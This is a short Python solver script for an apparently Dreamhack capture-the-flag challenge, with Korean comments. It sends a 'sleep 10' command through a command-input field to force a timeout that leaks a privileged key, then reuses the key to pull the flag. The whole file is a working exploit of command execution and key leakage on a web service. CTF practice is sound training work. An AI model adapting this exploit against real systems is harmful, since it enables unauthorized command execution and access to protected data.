import requests
import hashlib
import re

# Define the URL for the Flask application
url = 'http://host3.dreamhack.games:19459/flag'

# Define the guest key
guest_key = hashlib.md5(b"guest").hexdigest()

# Create a session
session = requests.Session()

# 5초 타임아웃을 유발하는 명령어를 사용하여 키 얻기
payload_sleep = {
    'key': guest_key,
    'cmd_input': 'sleep 10'
}
response_sleep = session.post(url, data=payload_sleep)

# 타임아웃 응답에서 키 값 추출
key_match = re.search(r'Your key: (\w+)', response_sleep.text)
if key_match:
    obtained_key = key_match.group(1)
    print(f"Obtained Key: {obtained_key}")

    # 얻은 키를 사용하여 플래그 값을 요청합니다.
    payload_flag = {
        'key': obtained_key,
        'cmd_input': ''
    }
    response_flag = session.post(url, data=payload_flag)
    
    # 응답에서 플래그 값 추출
    flag_match = re.search(r'(DH\{.*?\})', response_flag.text)
    if flag_match:
        flag_value = flag_match.group(1)
        print(f"Flag Value: {flag_value}")
    else:
        print("Failed to obtain flag from the response.")
else:
    print("Failed to obtain key from the response.")
